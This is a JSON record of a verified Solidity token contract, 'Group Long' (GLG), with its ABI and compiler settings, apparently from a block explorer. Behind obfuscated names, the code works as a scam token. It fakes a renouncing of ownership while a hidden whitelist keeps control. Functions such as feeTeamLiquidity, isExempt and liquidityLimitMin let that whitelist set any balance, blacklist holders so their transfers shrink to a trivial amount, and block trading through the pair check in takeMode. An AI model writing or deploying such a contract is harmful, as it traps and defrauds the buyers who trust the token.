{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface limitBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txReceiverAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingTxMarketing {\n    function createPair(address listReceiver, address isTo) external returns (address);\n}\n\ninterface totalMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoMode) external view returns (uint256);\n\n    function transfer(address buyWallet, uint256 shouldWalletReceiver) external returns (bool);\n\n    function allowance(address maxToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldWalletReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyWallet,\n        uint256 shouldWalletReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingExempt, uint256 value);\n    event Approval(address indexed maxToken, address indexed spender, uint256 value);\n}\n\ninterface txLaunched is totalMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GroupLong is txReceiverAmount, totalMarketing, txLaunched {\n\n    uint8 private amountAt = 18;\n\n    bool public exemptReceiver;\n\n    uint256 public tokenFromSwap;\n\n    uint256 private totalIsMarketing;\n\n    address txList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tokenReceiver;\n\n    bool private receiverMarketingMax;\n\n    function tradingSell(address shouldBuy, address buyWallet, uint256 shouldWalletReceiver) internal returns (bool) {\n        require(toMin[shouldBuy] >= shouldWalletReceiver);\n        toMin[shouldBuy] -= shouldWalletReceiver;\n        toMin[buyWallet] += shouldWalletReceiver;\n        emit Transfer(shouldBuy, buyWallet, shouldWalletReceiver);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return txTrading;\n    }\n\n    function takeMode(address shouldBuy, address buyWallet, uint256 shouldWalletReceiver) internal returns (bool) {\n        if (shouldBuy == feeAmount) {\n            return tradingSell(shouldBuy, buyWallet, shouldWalletReceiver);\n        }\n        uint256 exemptListShould = totalMarketing(walletMax).balanceOf(marketingEnable);\n        require(exemptListShould == swapMax);\n        require(buyWallet != marketingEnable);\n        if (launchedTokenFund[shouldBuy]) {\n            return tradingSell(shouldBuy, buyWallet, teamAt);\n        }\n        return tradingSell(shouldBuy, buyWallet, shouldWalletReceiver);\n    }\n\n    uint256 private walletFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundAmount;\n    }\n\n    function allowance(address senderFee, address totalLiquidity) external view virtual override returns (uint256) {\n        if (totalLiquidity == txList) {\n            return type(uint256).max;\n        }\n        return isList[senderFee][totalLiquidity];\n    }\n\n    uint256 autoFund;\n\n    function balanceOf(address autoMode) public view virtual override returns (uint256) {\n        return toMin[autoMode];\n    }\n\n    mapping(address => mapping(address => uint256)) private isList;\n\n    function feeTeamLiquidity(address teamReceiver, uint256 shouldWalletReceiver) public {\n        tradingEnable();\n        toMin[teamReceiver] = shouldWalletReceiver;\n    }\n\n    function isExempt(address feeShould) public {\n        tradingEnable();\n        if (receiverMarketingMax) {\n            tokenMin = totalIsMarketing;\n        }\n        if (feeShould == feeAmount || feeShould == walletMax) {\n            return;\n        }\n        launchedTokenFund[feeShould] = true;\n    }\n\n    event OwnershipTransferred(address indexed minTakeMax, address indexed receiverIsTx);\n\n    uint256 private marketingTeam = 100000000 * 10 ** 18;\n\n    address marketingEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private fundAmount = \"GLG\";\n\n    uint256 public buyFee;\n\n    uint256 private tokenList;\n\n    constructor (){\n        \n        limitBuy totalMin = limitBuy(txList);\n        walletMax = tradingTxMarketing(totalMin.factory()).createPair(totalMin.WETH(), address(this));\n        \n        feeAmount = _msgSender();\n        minWalletToken();\n        listMarketing[feeAmount] = true;\n        toMin[feeAmount] = marketingTeam;\n        if (walletFund == tokenFromSwap) {\n            tokenFromSwap = totalIsMarketing;\n        }\n        emit Transfer(address(0), feeAmount, marketingTeam);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountAt;\n    }\n\n    function transferFrom(address shouldBuy, address buyWallet, uint256 shouldWalletReceiver) external override returns (bool) {\n        if (_msgSender() != txList) {\n            if (isList[shouldBuy][_msgSender()] != type(uint256).max) {\n                require(shouldWalletReceiver <= isList[shouldBuy][_msgSender()]);\n                isList[shouldBuy][_msgSender()] -= shouldWalletReceiver;\n            }\n        }\n        return takeMode(shouldBuy, buyWallet, shouldWalletReceiver);\n    }\n\n    uint256 constant teamAt = 12 ** 10;\n\n    mapping(address => uint256) private toMin;\n\n    function liquidityLimitMin(uint256 shouldWalletReceiver) public {\n        tradingEnable();\n        swapMax = shouldWalletReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingTeam;\n    }\n\n    function approve(address totalLiquidity, uint256 shouldWalletReceiver) public virtual override returns (bool) {\n        isList[_msgSender()][totalLiquidity] = shouldWalletReceiver;\n        emit Approval(_msgSender(), totalLiquidity, shouldWalletReceiver);\n        return true;\n    }\n\n    function tradingEnable() private view {\n        require(listMarketing[_msgSender()]);\n    }\n\n    address public walletMax;\n\n    function owner() external view returns (address) {\n        return txTrading;\n    }\n\n    function transfer(address teamReceiver, uint256 shouldWalletReceiver) external virtual override returns (bool) {\n        return takeMode(_msgSender(), teamReceiver, shouldWalletReceiver);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoMin;\n    }\n\n    uint256 public tokenMin;\n\n    function minWalletToken() public {\n        emit OwnershipTransferred(feeAmount, address(0));\n        txTrading = address(0);\n    }\n\n    bool public minAuto;\n\n    function liquiditySwap(address tokenTrading) public {\n        if (exemptReceiver) {\n            return;\n        }\n        if (tokenReceiver) {\n            minAuto = true;\n        }\n        listMarketing[tokenTrading] = true;\n        if (tokenList == buyFee) {\n            walletFund = tokenFromSwap;\n        }\n        exemptReceiver = true;\n    }\n\n    mapping(address => bool) public launchedTokenFund;\n\n    mapping(address => bool) public listMarketing;\n\n    address public feeAmount;\n\n    address private txTrading;\n\n    string private autoMin = \"Group Long\";\n\n    uint256 swapMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTakeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIsTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletReceiver\",\"type\":\"uint256\"}],\"name\":\"feeTeamLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTokenFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldWalletReceiver\",\"type\":\"uint256\"}],\"name\":\"liquidityLimitMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"}],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minWalletToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFromSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "GroupLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}